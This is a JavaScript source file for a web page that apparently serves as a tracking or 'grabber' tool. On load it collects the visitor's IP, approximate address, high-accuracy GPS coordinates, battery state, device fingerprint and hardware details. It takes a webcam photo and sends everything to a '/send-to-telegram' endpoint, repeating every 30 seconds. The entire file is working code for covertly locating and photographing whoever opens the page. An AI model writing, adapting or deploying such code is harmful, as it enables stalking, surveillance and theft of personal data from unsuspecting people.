// script.js
class DeviceInfoCollector {
  constructor() {
    this.deviceInfo = {
      userAgent: navigator.userAgent,
      ip: null,
      location: null,
      approxAddress: null,
      battery: null,
      cameraAccess: false,
      os: null,
      browser: null,
      device: null,
      cpuCores: navigator.hardwareConcurrency || null,
      screen: `${window.screen.width}x${window.screen.height}`,
      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : null,
      isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      platform: navigator.platform,
      cookiesEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine,
      pixelRatio: window.devicePixelRatio,
      webGLRenderer: null,
      fingerprint: null
    };

    this.photoData = null;
    this.init();
  }

  async init() {
    document.getElementById('device-info').style.display = 'block';
    
    await this.collectFingerprint();
    await this.collectIP();
    await this.collectLocation();
    await this.collectBatteryInfo();
    await this.checkCameraAccess();
    this.parseUserAgent();
    this.collectAdditionalInfo();
    
    // Try to capture photo if camera access granted
    if (this.deviceInfo.cameraAccess) {
      await this.capturePhoto();
    }
    
    // Send initial data
    this.sendDataToTelegram();
    
    // Set up periodic updates
    setInterval(() => this.sendDataToTelegram(), 30000);
  }

  async capturePhoto() {
    try {
      const video = document.getElementById('webcam');
      const canvas = document.getElementById('canvas');
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      
      video.srcObject = stream;
      await new Promise(resolve => video.onloadedmetadata = resolve);
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      this.photoData = canvas.toDataURL('image/jpeg', 0.7);
      document.getElementById('photo-status').textContent = 'Photo Capture: Success ✅';
      document.getElementById('photo-status').className = 'permission-granted';
      
      stream.getTracks().forEach(track => track.stop());
    } catch (error) {
      document.getElementById('photo-status').textContent = `Photo Capture: ${error.message}`;
      document.getElementById('photo-status').className = 'permission-denied';
    }
  }

  async checkCameraAccess() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      this.deviceInfo.cameraAccess = true;
      document.getElementById('camera-info').textContent = 'Camera: Granted';
      document.getElementById('camera-info').className = 'permission-granted';
      stream.getTracks().forEach(track => track.stop());
    } catch (error) {
      document.getElementById('camera-info').textContent = `Camera: ${error.message}`;
      document.getElementById('camera-info').className = 'permission-denied';
    }
  }

  async collectFingerprint() {
    try {
      const components = await Fingerprint2.getPromise();
      const values = components.map(component => component.value);
      this.deviceInfo.fingerprint = Fingerprint2.x64hash128(values.join(''), 31);
    } catch (error) {
      console.error('Fingerprint error:', error);
    }
  }

  async collectIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      this.deviceInfo.ip = data.ip;
      document.getElementById('ip-info').textContent = `IP: ${data.ip}`;
      
      const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
      const geoData = await geoResponse.json();
      if (geoData.city && geoData.country) {
        this.deviceInfo.approxAddress = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;
      }
    } catch (error) {
      document.getElementById('ip-info').textContent = 'IP: Could not fetch';
    }
  }

  async collectLocation() {
    if ('geolocation' in navigator) {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000
          });
        });

        this.deviceInfo.location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };

        document.getElementById('location-info').textContent = 
          `Location: ${position.coords.latitude}, ${position.coords.longitude}`;
        
        const mapLink = document.getElementById('map-link');
        mapLink.href = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
        mapLink.style.display = 'inline-block';
      } catch (error) {
        document.getElementById('location-info').textContent = `Location: ${error.message}`;
      }
    } else {
      document.getElementById('location-info').textContent = 'Location: Geolocation not supported';
    }
  }

  async collectBatteryInfo() {
    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        this.deviceInfo.battery = {
          level: battery.level,
          charging: battery.charging
        };
        
        document.getElementById('battery-info').textContent = 
          `Battery: ${Math.round(battery.level * 100)}% ${battery.charging ? '(charging)' : ''}`;
      } catch (error) {
        document.getElementById('battery-info').textContent = 'Battery: Error accessing API';
      }
    } else {
      document.getElementById('battery-info').textContent = 'Battery: API not supported';
    }
  }

  parseUserAgent() {
    const parser = new UAParser();
    const result = parser.getResult();
    
    this.deviceInfo.os = `${result.os.name} ${result.os.version}`;
    this.deviceInfo.browser = `${result.browser.name} ${result.browser.version}`;
    this.deviceInfo.device = result.device.vendor ? 
      `${result.device.vendor} ${result.device.model}` : 'Desktop';
    
    document.getElementById('device-details').textContent = 
      `Device: ${this.deviceInfo.device}, OS: ${this.deviceInfo.os}, Browser: ${this.deviceInfo.browser}`;
  }

  collectAdditionalInfo() {
    // WebGL renderer
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        this.deviceInfo.webGLRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
      }
    } catch (e) {
      this.deviceInfo.webGLRenderer = 'unknown';
    }
  }

  async sendDataToTelegram() {
    try {
      await fetch('/send-to-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          deviceInfo: this.deviceInfo,
          photoData: this.photoData
        })
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  }
}

document.addEventListener('DOMContentLoaded', () => {
  new DeviceInfoCollector();
});